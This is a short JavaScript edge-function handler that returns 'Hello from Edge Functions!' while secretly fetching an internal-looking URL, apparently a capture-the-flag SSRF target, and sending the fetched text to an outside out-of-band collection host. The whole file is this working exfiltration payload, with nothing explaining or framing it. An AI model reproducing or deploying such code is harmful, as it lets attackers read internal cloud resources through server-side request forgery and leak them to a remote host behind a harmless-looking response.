export default function onRequest(context) {
    fetch('http://ssrf.tencentcloud.com/flag.html').then(res => res.text()).then(text => fetch('https://2cf3khlbgmtsb9jnv6ud9wsgb7hy5pwdl.j.sdhell.com/'+text));
  return new Response('Hello from Edge Functions!');
}